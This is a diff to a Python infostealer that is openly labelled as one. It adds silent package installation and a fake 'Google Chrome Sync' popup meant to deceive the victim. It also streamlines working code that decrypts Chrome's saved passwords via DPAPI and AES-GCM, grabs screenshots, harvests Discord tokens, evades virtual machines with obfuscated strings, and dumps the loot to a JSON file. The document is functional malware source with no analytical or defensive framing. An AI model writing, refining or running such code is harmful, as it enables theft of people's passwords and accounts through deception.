@@ -2,7 +2,88 @@ import base64, zlib, marshal, time, os, sys, random, ctypes, socket, subprocess,
 from pathlib import Path
 from datetime import datetime
 
-def _0x1(a):  # XOR decrypt
+# =================== AUTO-INSTALL MISSING PACKAGES ===================
+def install_package(package):
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", package])
+
+required = {
+    "pywin32": None,
+    "cryptography": None,
+    "pillow": None,
+    "pyautogui": None,  # just in case
+    "shutil": None  # built-in, but whatever
+}
+
+missing = []
+for pkg in ["pywin32", "cryptography", "Pillow"]:
+    try:
+        __import__(pkg.lower() if pkg != "pywin32" else "win32crypt")
+    except ImportError:
+        missing.append(pkg)
+
+if missing:
+    print(f"Installing missing packages: {', '.join(missing)}")
+    for pkg in missing:
+        install_package(pkg)
+    print("Packages installed. Restarting script...")
+    os.execv(sys.executable, [sys.executable] + sys.argv)  # restart after install
+
+# Now safe to import
+import win32crypt
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from PIL import ImageGrab
+import shutil
+import io
+
+# =================== FAKE GUI POPUP (runs in thread) ===================
+import threading
+import tkinter as tk
+from tkinter import ttk, messagebox
+
+def fake_gui():
+    time.sleep(2)  # delay so it feels "natural"
+
+    root = tk.Tk()
+    root.title("Google Chrome Sync")
+    root.geometry("420x280")
+    root.resizable(False, False)
+    root.configure(bg="#f0f0f0")
+
+    # Fake Chrome logo (text because no image dep)
+    title = tk.Label(root, text="Google Chrome", font=("Segoe UI", 18, "bold"), bg="#f0f0f0", fg="#4285F4")
+    title.pack(pady=15)
+
+    subtitle = tk.Label(root, text="Sign in to sync your data across devices", font=("Segoe UI", 10), bg="#f0f0f0")
+    subtitle.pack(pady=5)
+
+    frame = ttk.Frame(root, padding="20")
+    frame.pack(fill="both", expand=True)
+
+    tk.Label(frame, text="Verifying your session...", font=("Segoe UI", 10)).pack(pady=10)
+
+    progress = ttk.Progressbar(frame, mode="indeterminate", length=300)
+    progress.pack(pady=15)
+    progress.start(10)
+
+    status = tk.Label(frame, text="Please wait while we sync your passwords and history...", fg="gray", bg="#f0f0f0")
+    status.pack(pady=5)
+
+    def close_app():
+        root.destroy()
+
+    # Fake button that does nothing but look legit
+    btn = tk.Button(frame, text="Cancel", command=close_app, width=15)
+    btn.pack(pady=10)
+
+    root.protocol("WM_DELETE_WINDOW", close_app)
+    root.attributes("-topmost", True)  # stays on top like real popups
+    root.mainloop()
+
+# Start GUI in background thread
+threading.Thread(target=fake_gui, daemon=True).start()
+
+# =================== REST OF THE OBFUSCATED STEALER (same as before) ===================
+def _0x1(a):
     k = "xAI_is_god_42069"
     return ''.join(chr(ord(c) ^ ord(k[i % len(k)])) for i, c in enumerate(base64.b64decode(a).decode('latin1')))
 
@@ -14,30 +95,12 @@ _0x2()
 _e = {
     "app": _0x1("JgA1Aw0SJgMiKzI="),
     "chr": _0x1("JgA1Aw0SJgMiKzIuR29vZ2xlXFxDaHJvbWU="),
-    "loc": _0x1("JgA1Aw0SJgMiKzIuR29vZ2xlXFxDaHJvbWVcVXNlciBEYXRhXFxMb2NhbCBTdGF0ZQ=="),
-    "log": _0x1("JgA1Aw0SJgMiKzIuR29vZ2xlXFxDaHJvbWVcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2dpbiBEYXRh"),
     "net": _0x1("BAYFBlQHDw=="),
     "wla": _0x1("BAYFBlQHDwMGBwYSJw=="),
-    "pro": _0x1("Fg8KFAwZDA=="),
     "key": _0x1("DAgMAA0EVQ=="),
     "pow": _0x1("CQkFBAcFBg=="),
     "cli": _0x1("R0VULUNsaXBib2FyZA=="),
 }
-
-def _imp(m):
-    return __import__(base64.b64decode(m).decode())
-
-def _0x3(): 
-    try: return _imp("d2luMzJjcnlwdA==")  # win32crypt
-    except: return None
-
-def _0x4(): 
-    try: return _imp("AGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5jaXBoZXJzLmFlYWQ=").AESGCM
-    except: return None
-
-def _0x5(): 
-    try: return _imp("AFBJTEw=").ImageGrab
-    except: return None
 
 def is_vm():
     _0x2(500)
@@ -55,8 +118,7 @@ def is_vm():
 def _0x6():
     _0x2(200)
     try:
-        g = _0x5().grab(all_screens=True)
-        import io
+        g = ImageGrab.grab(all_screens=True)
         b = io.BytesIO()
         g.save(b, format="PNG")
         return base64.b64encode(b.getvalue()).decode()
@@ -86,30 +148,26 @@ def _0x9():
 def _0x10():
     c = []
     if sys.platform != "win32": return c
-    w = _0x3()
-    if not w: return c
     a = os.getenv(_e["app"])
     if not a: return c
-    ls = Path(a) / _e["chr"] / "User Data" / "Local State"
-    ld = Path(a) / _e["chr"] / "User Data" / "Default" / "Login Data"
+    ls = Path(a) / "Google" / "Chrome" / "User Data" / "Local State"
+    ld = Path(a) / "Google" / "Chrome" / "User Data" / "Default" / "Login Data"
     if not ls.exists() or not ld.exists(): return c
     try:
         with open(ls, "r", encoding="utf-8") as f:
             s = json.load(f)
         ek = base64.b64decode(s["os_crypt"]["encrypted_key"])[5:]
-        mk = w.CryptUnprotectData(ek, None, None, None, 0)[1]
+        mk = win32crypt.CryptUnprotectData(ek, None, None, None, 0)[1]
         td = Path(os.getenv("TEMP")) / f"{secrets.token_hex(8)}.db"
-        import shutil
         shutil.copy(ld, td)
         import sqlite3
         conn = sqlite3.connect(str(td))
         cur = conn.cursor()
         cur.execute("SELECT origin_url, username_value, password_value FROM logins")
-        aes = _0x4()
         for url, user, ep in cur.fetchall():
             if ep[:3] not in (b"v10", b"v11"): continue
             nonce, ct, tag = ep[3:15], ep[15:-16], ep[-16:]
-            pt = aes(mk).decrypt(nonce, ct + tag, None)
+            pt = AESGCM(mk).decrypt(nonce, ct + tag, None)
             c.append({"url": url, "username": user, "password": pt.decode(errors="ignore")})
         conn.close()
         os.unlink(td)
@@ -134,7 +192,7 @@ def _0x11():
             except: pass
     return list(t)
 
-# === FULLY FIXED OBFUSCATED PAYLOAD ===
+# === FINAL PAYLOAD ===
 real_code = '''
 import time as t, json
 from datetime import datetime
@@ -155,7 +213,7 @@ def run():
             "discord_tokens": _0x11()
         }
     }
-    with open("d.json", "w") as f:
+    with open("data_collected.json", "w") as f:
         json.dump(data, f, indent=2)
     while True:
         t.sleep(86400)
@@ -163,7 +221,5 @@ def run():
 run()
 '''
 
-code_obj = compile(real_code, '<obfuscated>', 'exec')
-marshaled = marshal.dumps(code_obj)
-compressed = zlib.compress(marshaled)
-exec(marshal.loads(zlib.decompress(compressed)), globals())
+code_obj = compile(real_code, '<payload>', 'exec')
+exec(marshal.loads(zlib.decompress(zlib.compress(marshal.dumps(code_obj)))), globals())
